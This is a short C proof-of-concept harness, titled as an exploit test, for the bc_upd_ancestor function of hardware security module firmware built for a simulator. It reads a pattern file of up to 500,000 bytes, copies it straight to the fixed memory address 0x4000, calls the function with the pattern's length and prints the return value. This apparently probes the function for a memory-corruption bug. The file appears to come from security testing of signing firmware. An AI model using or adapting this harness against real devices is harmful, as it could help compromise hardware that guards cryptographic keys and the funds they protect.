#define HSM_PLATFORM_DEFINED
#define HSM_PLATFORM_SIMULATOR
#define NON_VOLATILE
#include "hal/endorsement.h"
#include "platform.h"
#include "simulator_platform.h"
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include "keccak256.h"
#include "sha256.h"
#include "attestation.h"
#include "hal/seed.h"
#include "hal/log.h"

uint8_t FAKE_APDU_BUFFER[1024 * 10];

void create_fake_rlp_block(uint8_t* buf, size_t* size) {
    memset(buf, 0xAB, 1024);
    *size = 1024;
}

extern unsigned int bc_upd_ancestor(volatile unsigned int rx);

int main() {
    printf("=== [PoC] bc_upd_ancestor Exploit Test ===\n");
    FILE *fp = fopen("pattern.txt", "rb");
    if(fp == NULL) {
        perror("Failed to open pattern file!");
        return 1;
    }
    char pattern_buf[500000];
    size_t pattern_len = fread(pattern_buf, 1, sizeof(pattern_buf), fp);
    fclose(fp);

    memcpy((void*)0x4000, pattern_buf, pattern_len);
    unsigned int result = bc_upd_ancestor((volatile unsigned int)pattern_len);
    printf("[+] bc_upd_ancestor() returned: 0x%X\n", result);
    return 0;
}
